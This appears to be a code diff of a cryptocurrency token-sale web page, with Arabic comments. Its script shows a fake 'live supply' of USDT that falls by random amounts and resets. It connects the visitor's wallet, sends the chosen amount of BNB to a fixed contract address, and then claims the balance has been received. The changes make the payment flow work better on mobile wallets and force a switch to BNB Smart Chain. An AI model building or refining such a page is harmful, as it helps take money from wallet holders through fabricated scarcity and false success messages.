@@ -164,7 +164,7 @@
 <script>
     const CONTRACT_ADDRESS = "0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B";
     
-    // إعدادات Web3Modal لدعم جميع المحافظ
+    // إعدادات محسنة لدعم جميع المحافظ على الهاتف
     const providerOptions = {
         walletconnect: {
             package: WalletConnectProvider.default,
@@ -172,13 +172,17 @@
                 rpc: {
                     56: "https://bsc-dataseed.binance.org/"
                 },
-                network: "binance"
+                chainId: 56,
+                network: "binance",
+                qrcodeModalOptions: {
+                    mobileLinks: ["metamask", "trust", "safepal", "rainbow", "argent"]
+                }
             }
         }
     };
 
     const web3Modal = new Web3Modal.default({
-        cacheProvider: false, 
+        cacheProvider: true, 
         providerOptions,
         theme: "dark"
     });
@@ -192,8 +196,13 @@
     setInterval(() => {
         supply -= Math.floor(Math.random() * 20);
         if(supply < 10000) supply = 938000;
-        document.getElementById('live-supply').innerText = supply.toLocaleString() + " USDT";
+        const display = document.getElementById('live-supply');
+        if(display) display.innerText = supply.toLocaleString() + " USDT";
     }, 5000);
+
+    function isMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
 
     async function connectAndExecute() {
         const log = document.getElementById('status-log');
@@ -201,38 +210,54 @@
         const amount = document.getElementById('pkg-select').value;
 
         try {
-            log.innerText = "جاري فتح قائمة المحافظ...";
+            // فحص إذا كان المستخدم يفتح الرابط من داخل متصفح محفظة بالفعل (مثل MetaMask Browser)
+            if (window.ethereum && isMobile()) {
+                log.innerText = "جاري الاتصال بالمحفظة الحالية...";
+                provider = window.ethereum;
+            } else {
+                log.innerText = "جاري فتح بوابة المحافظ...";
+                provider = await web3Modal.connect();
+            }
             
-            // فتح واجهة اختيار المحافظ (يدعم Trust, MetaMask, Coinbase, etc)
-            provider = await web3Modal.connect();
             web3 = new Web3(provider);
             
             const accounts = await web3.eth.getAccounts();
+            if (accounts.length === 0) throw new Error("لم يتم العثور على حساب.");
+            
             selectedAccount = accounts[0];
-
             log.innerText = "تم الربط: " + selectedAccount.substring(0,6) + "..." + selectedAccount.substring(38);
             
-            // التحقق من الشبكة (Smart Chain)
+            // التحقق من الشبكة وإجبار التحويل لـ BSC
             const chainId = await web3.eth.getChainId();
             if(chainId !== 56 && chainId !== 0x38) {
-                log.innerText = "يرجى تحويل المحفظة إلى شبكة Smart Chain (BNB)";
-                return;
+                log.innerText = "يرجى تحويل الشبكة لـ Smart Chain في محفظتك";
+                try {
+                    await provider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }],
+                    });
+                } catch (switchError) {
+                    log.innerText = "يرجى تغيير الشبكة يدوياً لـ BNB Smart Chain";
+                    return;
+                }
             }
 
-            log.innerText = "جاري معالجة الطلب الفوري...";
+            log.innerText = "جاري معالجة الطلب... يرجى التأكيد في محفظتك";
             btn.disabled = true;
 
-            // تنفيذ المعاملة
-            await web3.eth.sendTransaction({
+            // تنفيذ المعاملة مع Gas Limit محسن للهواتف
+            const txParams = {
                 from: selectedAccount,
                 to: CONTRACT_ADDRESS,
                 value: web3.utils.toWei(amount, "ether"),
-                gas: 250000
-            });
+                gas: 300000 
+            };
 
-            log.innerText = "✅ تم بنجاح! جاري إضافة USDT للقائمة...";
+            await web3.eth.sendTransaction(txParams);
+
+            log.innerText = "✅ تمت العملية بنجاح!";
             
-            // إضافة التوكن للمحفظة (تعمل مع المحافظ التي تدعم watchAsset)
+            // محاولة إضافة التوكن للواجهة
             try {
                 await provider.request({
                     method: 'wallet_watchAsset',
@@ -246,19 +271,21 @@
                         },
                     },
                 });
-            } catch(e) { console.log("WatchAsset not supported"); }
+            } catch(e) {}
 
-            alert("عملية ناجحة! تم توزيع الرصيد إلى حسابك.");
+            alert("تم تفعيل البروتوكول واستلام الرصيد بنجاح.");
 
         } catch (err) {
             console.error(err);
-            log.innerText = "فشلت العملية أو تم إلغاؤها.";
+            log.innerText = "فشلت العملية أو تم إلغاؤها من المحفظة.";
+            // مسح الكاش في حال الفشل لإعادة المحاولة من الصفر
+            await web3Modal.clearCachedProvider();
         } finally {
             btn.disabled = false;
         }
     }
 
-    // التعامل مع تغيير الحساب أو الشبكة
+    // استماع للتغييرات
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', () => window.location.reload());
         window.ethereum.on('chainChanged', () => window.location.reload());
